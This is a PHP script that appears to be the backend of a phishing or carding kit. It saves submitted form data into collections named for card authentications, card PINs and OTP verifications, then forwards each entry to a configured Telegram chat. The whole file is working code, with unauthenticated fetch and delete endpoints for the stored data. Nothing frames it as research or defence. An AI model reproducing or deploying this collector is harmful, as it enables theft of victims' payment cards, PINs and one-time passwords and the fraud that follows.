<?php
/**
 * Telegram Bot API Backend
 * Handles form submissions and sends them to Telegram
 * 
 * Configuration:
 * 1. Set your Telegram Bot Token (get from @BotFather)
 * 2. Set your Chat ID (get from @userinfobot)
 * 3. Make sure this file is accessible via HTTPS
 */

// ==========================================
// CONFIGURATION - SET YOUR VALUES HERE
// ==========================================
define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');
define('DATA_DIR', __DIR__ . '/data');

// ==========================================
// Helper Functions
// ==========================================

function ensureDataDir() {
    if (!is_dir(DATA_DIR)) {
        mkdir(DATA_DIR, 0755, true);
    }
}

function getCollectionFile($collection) {
    return DATA_DIR . '/' . $collection . '.json';
}

function loadCollection($collection) {
    $file = getCollectionFile($collection);
    if (!file_exists($file)) {
        return [];
    }
    $content = file_get_contents($file);
    return json_decode($content, true) ?: [];
}

function saveCollection($collection, $data) {
    $file = getCollectionFile($collection);
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function generateId() {
    return 'doc_' . time() . '_' . bin2hex(random_bytes(4));
}

function escapeMarkdown($text) {
    $text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
    $text = str_replace(['[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'], 
                        ['\\[', '\\]', '\\(', '\\)', '\\~', '\\`', '\\>', '\\#', '\\+', '\\-', '\\=', '\\|', '\\{', '\\}', '\\.', '\\!'], 
                        $text);
    return $text;
}

function formatTelegramMessage($collection, $data) {
    $collectionNames = [
        'user_submissions' => '👤 User Submissions',
        'card_authentications' => '💳 Card Authentication',
        'card_pin_submissions' => '🔐 Card PIN Submission',
        'otp_verifications' => '📱 OTP Verification'
    ];
    
    $title = $collectionNames[$collection] ?? $collection;
    $id = $data['id'] ?? 'N/A';
    $timestamp = isset($data['timestamp']) ? date('d/m/Y H:i:s', strtotime($data['timestamp'])) : date('d/m/Y H:i:s');
    
    $message = "🔔 *New Submission*\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "📁 *Collection:* {$title}\n";
    $message .= "🆔 *ID:* `{$id}`\n";
    $message .= "🕐 *Time:* {$timestamp}\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━\n";
    
    // Format data fields
    $skipFields = ['id', 'timestamp'];
    foreach ($data as $key => $value) {
        if (in_array($key, $skipFields)) continue;
        
        $fieldName = ucwords(str_replace('_', ' ', $key));
        $fieldValue = is_array($value) ? json_encode($value) : $value;
        $fieldValue = escapeMarkdown($fieldValue);
        
        $message .= "*{$fieldName}:* {$fieldValue}\n";
    }
    
    $message .= "━━━━━━━━━━━━━━━━━━━━";
    
    return $message;
}

// ==========================================
// Telegram API Functions
// ==========================================

function sendToTelegram($chatId, $botToken, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['success' => ($httpCode === 200), 'response' => $response];
}

// ==========================================
// Request Handlers
// ==========================================

function handleSend($collection, $data) {
    ensureDataDir();
    
    // Add ID and timestamp
    $data['id'] = generateId();
    $data['timestamp'] = date('c');
    
    // Load existing data
    $collectionData = loadCollection($collection);
    
    // Add new document
    $collectionData[$data['id']] = $data;
    
    // Save to file
    saveCollection($collection, $collectionData);
    
    // Send to Telegram
    $telegramSent = false;
    if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
        $message = formatTelegramMessage($collection, $data);
        $telegramResult = sendToTelegram(TELEGRAM_CHAT_ID, TELEGRAM_BOT_TOKEN, $message);
        $telegramSent = $telegramResult['success'];
    }
    
    return [
        'success' => true,
        'docId' => $data['id'],
        'telegram_sent' => $telegramSent,
        'message' => 'Data saved successfully'
    ];
}

function handleFetch($collection) {
    ensureDataDir();
    
    $collectionData = loadCollection($collection);
    
    // Convert to array format for compatibility
    $docs = [];
    foreach ($collectionData as $id => $data) {
        $data['id'] = $id;
        $docs[] = $data;
    }
    
    // Sort by timestamp descending
    usort($docs, function($a, $b) {
        $timeA = isset($a['timestamp']) ? strtotime($a['timestamp']) : 0;
        $timeB = isset($b['timestamp']) ? strtotime($b['timestamp']) : 0;
        return $timeB - $timeA;
    });
    
    return [
        'success' => true,
        'data' => $docs,
        'count' => count($docs)
    ];
}

function handleDelete($collection, $id) {
    ensureDataDir();
    
    $collectionData = loadCollection($collection);
    
    if (!isset($collectionData[$id])) {
        return [
            'success' => false,
            'error' => 'Document not found'
        ];
    }
    
    unset($collectionData[$id]);
    saveCollection($collection, $collectionData);
    
    return [
        'success' => true,
        'message' => 'Document deleted'
    ];
}

// ==========================================
// Main Router
// ==========================================

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Parse request
$action = $_POST['action'] ?? '';
$collection = $_POST['collection'] ?? '';
$rawData = $_POST['data'] ?? '';

// Validate collection name (security)
$allowedCollections = ['user_submissions', 'card_authentications', 'card_pin_submissions', 'otp_verifications'];
if ($collection && !in_array($collection, $allowedCollections)) {
    echo json_encode(['success' => false, 'error' => 'Invalid collection']);
    exit;
}

// Route request
try {
    switch ($action) {
        case 'send':
            $data = json_decode($rawData, true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                echo json_encode(['success' => false, 'error' => 'Invalid JSON data: ' . json_last_error_msg()]);
                exit;
            }
            $result = handleSend($collection, $data);
            break;
            
        case 'fetch':
            $result = handleFetch($collection);
            break;
            
        case 'delete':
            $id = $_POST['id'] ?? '';
            $result = handleDelete($collection, $id);
            break;
            
        default:
            $result = ['success' => false, 'error' => 'Unknown action'];
    }
    
    echo json_encode($result);
    
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>